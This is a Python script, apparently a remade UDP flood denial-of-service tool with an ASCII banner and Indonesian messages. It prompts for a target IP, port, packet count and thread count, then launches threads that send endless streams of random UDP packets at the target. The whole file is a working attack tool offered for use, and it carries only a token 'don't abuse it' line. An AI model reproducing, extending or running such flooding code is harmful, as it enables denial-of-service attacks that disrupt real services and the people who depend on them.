import random
import socket
import threading
import os,sys

os.system("clear")
print('''
    Remake By : RA3748                   
 __  ___________     
/  _ \     /  \ 
| |_) /   /    \ 
|  _ <   /  __  \ 
\_| \_\ /        \
                                
''')
print("Jangan Abuse Pakenya")
print("Tools Remake By RA3748")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input("Gass Gak Ni? (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" RA3748 BERULAH!!!")
		except:
			print(" RA3748 Gagal Menyerang:(")

def run2():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" RA3748 BERULAH!!!")
		except:
			s.close()
			print(" RA3748 Gagal Menyerang:(")

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" RA3748 BERULAH !!!")
		except:
			s.close()
			print(" RA3748 Gagal Menyerang:(")

def run4():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" RA3748 BERULAH !!!")
		except:
			s.close()
			print(" RA3748 Gagal Menyerang:(")			

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start() 